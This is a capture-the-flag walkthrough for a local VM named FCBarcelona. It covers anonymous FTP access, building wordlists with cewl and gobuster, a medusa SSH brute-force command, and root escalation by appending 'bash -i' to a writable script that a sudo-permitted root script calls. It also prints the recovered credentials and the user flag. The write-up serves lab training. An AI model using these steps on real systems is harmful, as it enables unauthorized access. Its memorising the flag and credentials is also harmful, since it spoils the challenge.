# Challenge MAchien FCBarcelona 

## Intro : 
machine : a VM deployed locally 
# Recon 
nmap 
'''shell 
cat result 
'''
## open ports 
 
80 : web port : gobuster , nothing special 

nothing to find here :( :( 
 
445 : open  netbios-ssn Samba 445/tcp open  microsoft-ds   139:  open  netbios-ssn

nothing worked here , even we try the metasploit 

21 : FTP port 

here let's try to connect over FTP 
''shell
ftp ipaddress
'''
default login 
anonymous 
and bow it's work 

let's see what we can do 
'''shell
ls
get notice.txt
'''
here we found a file named notice.txt 
let's what's inside : 

hi, as you know, this box is about brute force, as the suggestion says. As long as you don't get to root, keep guessing and applying brute force and brute force. Let's say for example, in our web application we like to keep things under a staduim that we love so much in Barcelona. well you have the list of staduims try to find what you are looking for;)
en spanish language but we translated it with Google hahahah h 


so the content of this file tell us to bruteforce the login with ssh connection 



22 : ssh port 

how how let's try bruteforcing the login with the stadium list 

tool we can bruteforce with : 
### hydra or graphic hydra 
### Ncrack brute force 
### Medusa brute force 
### metasploit bruteforce 


##### So let's make our wordlist from the webpage in the machine by : 

'''shell
cewl ipaddress new_wordlist
'''

then let's fetch the directories on the web 

'''shell
gobuster -dir -u http://ipaddress -w /path/new_wordlist 
'''

and bow we found something maybe useful 

a directory named CampNou


then let's see what's inside :
we found a list of players 

So let's make a new wordlist with these players names ; to bruteforce the ssh login

'''shell
cewl http://ipaddress/CampNou
'''

here we created our wordlist , let's bruteforce the ssh login 
i choosed medusa because Medusa is intended to be speedy , massively parallel

medusa -u /wordlist1 -P  /wordlist  -M ssh -h ipaddress


login Ansu
password Fati

Linux FCBarcelona 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64
⠀⠀⣀⣀⣀⣀⣠⠴⠚⠦⣄⣀⣀⣀⣀⣠⠴⠓⠦⣄⣀⣀⣀⣀⠀⠀
⠀⠸⡁⠈⠉⠁⠀⣴⣾⣦⠀⠉⠉⠉⣉⡄⢰⡇⢠⡄⢨⣉⠀⢈⠇⠀
⠀⠀⢳⡀⢀⣀⣀⣿⣿⣿⣀⣀⣀⠀⣿⡇⢸⡇⢸⡇⢸⣿⢠⡟⠀⠀
⠀⠀⠘⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⡇⢸⡇⢸⡇⢸⣿⢸⠁⠀⠀
⠀⠀⢸⡇⠈⠉⠉⣿⣿⣿⠉⠉⠁⠀⣿⡇⢸⡇⢸⡇⢸⣿⢸⡆⠀⠀
⠀⢀⡞⠀⠀⠀⠀⠛⠛⠛⠀⠀⠀⠀⠛⠃⠘⠃⠘⠃⠘⠛⠀⢳⡀⠀
⣠⠞⢀⣾⣿⣿⡇⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⢸⣿⣿⣷⡀⠳⣄
⠙⢦⠈⣿⣿⣿⡇⠀⠀⠀⢸⡿⢿⠿⢿⡇⠀⠀⠀⢸⣿⣿⣿⠁⡴⠋
⠀⢸⠀⣿⣿⣿⡇⠀⠀⢠⢻⠁⢘⠉⠑⢿⡀⠀⠀FC BARCELONA <3
⠀⠸⡄⢻⣿⣿⡇⠀⠀⠘⡬⠷⠔⠉⡷⢤⠃⠀⠀⢸⣿⣿⡟⢠⠇⠀
⠀⠀⢳⡈⢻⣿⡇⠀⠀⠀⢹⣶⣦⣩⣴⡏⠀⠀⠀⢸⣿⠟⢁⡞⠀⠀
⠀⠀⠀⠙⢦⡉⠃⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠘⢉⡴⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠉⠓⠦⣤⣀⣈⡙⠻⠟⢋⣁⣀⣤⠴⠚⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⢦⡴⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗  
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝

Last login: Sun Nov 15 20:53:18 2020
Ansu@FCBarcelona:~$ 


let's see what's inside the home directory 
and bow we found the user flag inside user.txt 
But u need understand spanish language hhhhhhhh 

hola campeón
 espero que tu lesión esté mejorando. 
bueno, si estás aquí, significa que tienes la bandera de usuario que es "SergiRobertoIsABadPlayer". 
También quiero recordarte que uses el recordatorio de fecha para la revisión de tu rodilla en el hospital. 
mantente a salvo y vuelve pronto <3


---

Here My friend we are close to own the system
 
 here we need to found a priv escalation to own the root 

 so let's search any script runnable as root 
 '''shell
 Ansu@FCBarcelona:~$ sudo -l
[sudo] password for Ansu: 
Matching Defaults entries for Ansu on FcBarcelona:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User Ansu may run the following commands on FcBarcelona:
    (ALL : ALL) /root/reminder.sh
    '''

    Nice we have a file named reminder.sh 

## Privilege escalation

let's  run the LinEnum:
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

so here we found a fiel  /var/datemaker.sh
we can change on it 

so let's do it 
'''shell 
echo "bash -i" >> /var/datemaker.sh
'''
then let's run the file in the root repo 

'''shell
sudo ./root/reminder.sh
[sudo] password for Ansu: 
la fecha de revisión de su rodilla es en:
20 december 2020
root@FCBarcelona:/#
'''
and wow we are root now 
and u can got your flag 

--- 
thanks!